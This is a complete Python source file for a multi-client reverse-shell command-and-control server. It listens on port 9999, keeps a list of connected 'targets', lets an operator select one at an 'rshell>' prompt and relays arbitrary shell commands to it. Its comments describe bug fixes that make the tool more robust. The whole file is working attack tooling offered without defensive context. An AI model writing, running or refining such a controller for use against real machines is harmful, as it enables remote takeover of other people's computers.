import socket
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error:  " + str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg))
        time.sleep(5)
        socket_bind()

# accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established  " + address[0])
        except Exception:
            print("Error accepting connections! ")

# Prompt to send commands remotely
def start_turtle():
    while True:
        try:
            cmd = input('rshell>')
        except EOFError:
            # Happens if stdin is closed (e.g. Ctrl+D, or a piped input
            # source running out) -- exit the prompt loop cleanly instead
            # of crashing the whole thread with an unhandled traceback.
            print("\nInput closed, exiting rshell.")
            break
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

# displays all current connections
def list_connections():
    # BUG FIX: the original version called `del all_connections[i]` /
    # `del all_addresses[i]` while iterating over `enumerate(all_connections)`.
    # Deleting from a list mid-iteration shifts every later index down by
    # one, so the loop can silently skip checking the very next connection
    # (or raise an IndexError on a badly-timed disconnect). This version
    # collects the indices of dead connections first, then removes them
    # in one pass afterward, in reverse order so earlier deletions don't
    # shift the indices still waiting to be removed.
    results = ''
    dead_indices = []

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('  '))
            conn.recv(20480)
            results += str(i) + '   ' + str(all_addresses[i][0]) + '    ' + str(all_addresses[i][1]) + '\n'
        except Exception:
            dead_indices.append(i)

    for i in reversed(dead_indices):
        del all_connections[i]
        del all_addresses[i]

    print('.....Clients.......' + '\n' + results)

# select a target client
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '>', end="")
        return conn
    except Exception:
        print("Not a valid selection")
        return None

# connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
        except EOFError:
            print("\nInput closed, returning to rshell.")
            break
        try:
            if cmd == "quit":
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480).decode('utf-8'))
                print(client_response, end="")
        except Exception:
            print("Connection lost")
            break

# creating threads
def create_workers():
    for i in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True  # making it a daemon process
        t.start()

# doing jobs in queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()  # built-in function to indicate all the tasks are done

# each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()  # creates the threads
create_jobs()      # assigning jobs
